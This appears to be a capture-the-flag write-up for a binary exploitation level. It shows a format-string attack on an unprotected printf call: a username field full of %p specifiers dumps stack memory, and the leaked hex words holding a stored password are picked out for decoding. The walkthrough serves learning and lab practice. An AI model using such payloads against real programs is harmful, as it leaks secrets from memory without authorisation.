# level02

The level02 has only one main function, which reads the stdin.

We see that the program opens the file containing the desired password, and that the contents of the file are stored in the `local_a8` variable, which is declared on the stack. 

The function expects a username and password, but unlike the previous levels, there's no question of entering a precise value to be able to execute a shell or make an overflow.  

We can see a bash system call, but to enter the if, we need to enter the right password...  

On the other hand, at the end of the code, we can see an unprotected printf call : `printf(local_78);`  

And it's this flaw that we're going to exploit to recover our password. All we need to do is use %p to display the values in the stack.
The various variables are stored on the stack from top to bottom. All we need to do is locate our buffer, which is declared just after local_a8, and move up 5 values (as we read 41 characters):
```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
--[ Password: *****************************************
AAAAA 0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025204141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025  does not have access!
```

And here are our hexadecimal values:
```
0x756e505234376848 
0x45414a3561733951 
0x377a7143574e6758 
0x354a35686e475873 
0x48336750664b394d
```

Now we just need to reverse the order and convert (we made a program for this purpose : `decrypt.go`) our values to get our password!
